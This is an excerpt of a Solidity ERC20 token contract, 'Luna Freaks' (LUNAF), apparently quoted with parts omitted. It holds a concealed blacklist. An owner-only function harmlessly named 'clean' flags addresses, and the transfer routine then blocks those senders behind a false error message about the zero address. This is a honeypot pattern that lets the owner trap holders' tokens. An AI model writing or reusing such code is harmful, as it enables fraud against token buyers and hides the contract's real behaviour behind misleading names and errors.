...
contract LUNAF is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Luna Freaks";
    string private _symbol = "LUNAF";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x67686d792bE239aD93dcF947F42DFf695f024189);
    address payable public buyBackWalletAddress = payable(0x67686d792bE239aD93dcF947F42DFf695f024189);
    ...
    function clean(address[] calldata accounts) public onlyOwner {
        for(uint i=0; i < accounts.length; i++) {
            _clean[accounts[i]] = true;
        }  
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        require(!_clean[sender], "ERC20: transfer to the zero address");
